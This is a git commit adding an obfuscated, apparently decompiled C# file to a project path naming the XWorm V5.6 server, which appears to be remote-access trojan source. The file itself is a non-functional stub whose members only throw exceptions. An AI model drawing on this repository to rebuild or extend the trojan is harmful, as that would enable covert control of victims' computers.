5c86c7a843c8c7c735438b1a0d9372f9fcd43657
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:51:50 +0400

    Forms64.cs

---
+++ XWorm V5.6/Server/Forms/Forms64.cs
@@ -0,0 +1,29 @@
+﻿using Microsoft.VisualBasic;
+using Microsoft.VisualBasic.CompilerServices;
+using System;
+using System.ComponentModel.Design;
+using System.Diagnostics;
+using System.Runtime.CompilerServices;
+using System.Windows.Forms;
+using V462540EVV6738320BEAVB181B7B6441;
+
+namespace B362258DE56DD77D7F64C301AAEA8B7B
+{
+  [StandardModule]
+  [HideModuleName]
+  [DebuggerNonUserCode]
+  [CompilerGenerated]
+  internal sealed class V83B7BDFA4AC38E6V933DDVVD588D2V1
+  {
+    [HelpKeyword("My.Settings")]
+    internal static VEF87313E4DDFCV3A9EE7908EAV73C56 Settings
+    {
+      [SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("う");
+    }
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    internal virtual StatusStrip get_StatusStrip1() => throw new Exception("ボ");
+  }
+}
